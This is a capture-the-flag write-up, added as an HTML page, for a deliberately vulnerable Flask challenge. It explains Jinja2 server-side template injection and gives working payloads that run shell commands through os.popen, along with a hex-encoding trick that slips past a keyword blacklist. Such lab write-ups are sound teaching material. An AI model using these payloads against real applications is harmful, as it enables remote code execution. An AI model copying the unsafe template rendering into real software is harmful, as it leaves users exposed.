@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Build-a-website</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>flask</li>
+            <li>jinja</li>
+            <li>ssti</li>
+            <li>rce</li>
+            <li>filter bypass</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="BuildAWebsite_0"></a>Build-A-Website</h1>
+<h2 class="code-line" data-line-start=2 data-line-end=3><a id="Description_2"></a>Description</h2>
+<p class="has-line-data" data-line-start="3" data-line-end="4">I made a website where y’all can create your own websites! Should be considerably secure even though I’m a bit rusty with Flask.</p>
+<h2 class="code-line" data-line-start=5 data-line-end=6><a id="Files_5"></a>Files</h2>
+<p class="has-line-data" data-line-start="6" data-line-end="7">Provided source code</p>
+<h2 class="code-line" data-line-start=8 data-line-end=9><a id="Code_8"></a>Code</h2>
+<h3 class="code-line" data-line-start=9 data-line-end=10><a id="apppy_9"></a><code>app.py</code></h3>
+<pre><code class="has-line-data" data-line-start="11" data-line-end="41" class="language-python"><span class="hljs-comment">#!/usr/bin/env python3</span>
+
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template_string, request, redirect, url_for
+<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode
+
+app = Flask(__name__)
+
+<span class="hljs-decorator">@app.route('/')</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
+  <span class="hljs-comment"># i dont remember how to return a string in flask so</span>
+  <span class="hljs-comment"># here goes nothing :rooNervous:</span>
+  <span class="hljs-keyword">return</span> render_template_string(open(<span class="hljs-string">'templates/index.html'</span>).read())
+
+<span class="hljs-decorator">@app.route('/backend')</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backend</span><span class="hljs-params">()</span>:</span>
+  website_b64 = b64encode(request.args[<span class="hljs-string">'content'</span>].encode())
+  <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'site'</span>, content=website_b64))
+
+<span class="hljs-decorator">@app.route('/site')</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">site</span><span class="hljs-params">()</span>:</span>
+  content = b64decode(request.args[<span class="hljs-string">'content'</span>]).decode()
+  <span class="hljs-comment">#prevent xss</span>
+  blacklist = [<span class="hljs-string">'script'</span>, <span class="hljs-string">'iframe'</span>, <span class="hljs-string">'cookie'</span>, <span class="hljs-string">'document'</span>, <span class="hljs-string">"las"</span>, <span class="hljs-string">"bas"</span>, <span class="hljs-string">"bal"</span>, <span class="hljs-string">":roocursion:"</span>] <span class="hljs-comment"># no roocursion allowed</span>
+  <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist:
+    <span class="hljs-keyword">if</span> word <span class="hljs-keyword">in</span> content:
+      <span class="hljs-comment"># this should scare them away</span>
+      content = <span class="hljs-string">"*** stack smashing detected ***: python3 terminated"</span>
+  csp = <span class="hljs-string">'''&lt;head&gt;\n&lt;meta http-equiv="Content-Security-Policy" content="default-src 'none'"&gt;\n&lt;/head&gt;\n'''</span>
+  <span class="hljs-keyword">return</span> render_template_string(csp + content)
+</code></pre>
+<h2 class="code-line" data-line-start=42 data-line-end=43><a id="Methodology_42"></a>Methodology</h2>
+<p class="has-line-data" data-line-start="43" data-line-end="44">We can input any html code which on the next page will get rendered.</p>
+<p class="has-line-data" data-line-start="45" data-line-end="46"><img src="./web1.PNG" alt="web1"></p>
+<p class="has-line-data" data-line-start="47" data-line-end="48"><img src="./web2.PNG" alt="web2"></p>
+<p class="has-line-data" data-line-start="49" data-line-end="50">We are however forbidden to use some words. The author deliberatly uses template rendering in an unsafe manner with this method <code>render_template_string()</code>. Since flask natively uses <code>jinja2</code> as a templeting engine, we can do an <code>SSTI</code> to have <code>RCE</code>.</p>
+<p class="has-line-data" data-line-start="51" data-line-end="52"><img src="./web3.PNG" alt="web3"></p>
+<p class="has-line-data" data-line-start="53" data-line-end="54"><img src="./web4.PNG" alt="web4"></p>
+<p class="has-line-data" data-line-start="55" data-line-end="56">We have code exec.</p>
+<h2 class="code-line" data-line-start=57 data-line-end=58><a id="Exploit_57"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="58" data-line-end="59">We can use a commonly known <code>jinja</code> payload to have <code>rce</code> with this</p>
+<p class="has-line-data" data-line-start="60" data-line-end="61"><code>{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</code></p>
+<p class="has-line-data" data-line-start="62" data-line-end="63">This will get blocked because there is a forbidden substring <code>bal</code> in <code>__globals__</code>. We will <code>hex</code> this string to bypass the check.</p>
+<p class="has-line-data" data-line-start="64" data-line-end="65"><code>{{request.application[&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;].__builtins__.__import__('os').popen('ls').read()}}</code></p>
+<h2 class="code-line" data-line-start=66 data-line-end=67><a id="Loot_66"></a>Loot</h2>
+<p class="has-line-data" data-line-start="67" data-line-end="68"><code>{{request.application[&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;].__builtins__.__import__('os').popen('ls').read()}}</code></p>
+<p class="has-line-data" data-line-start="69" data-line-end="70"><img src="./exploit1.PNG" alt="exploit1"></p>
+<p class="has-line-data" data-line-start="71" data-line-end="72"><code>{{request.application[&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;].__builtins__.__import__('os').popen('cat flag.txt').read()}}</code></p>
+<p class="has-line-data" data-line-start="73" data-line-end="74"><img src="./exploit2.PNG" alt="exploit2"></p>
+<h2 class="code-line" data-line-start=75 data-line-end=76><a id="Flag_75"></a>Flag</h2>
+<p class="has-line-data" data-line-start="76" data-line-end="77"><strong>ictf{:rooYay:<em>:rooPOG:</em>:rooHappy:_:rooooooooooooooooooooooooooo:}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
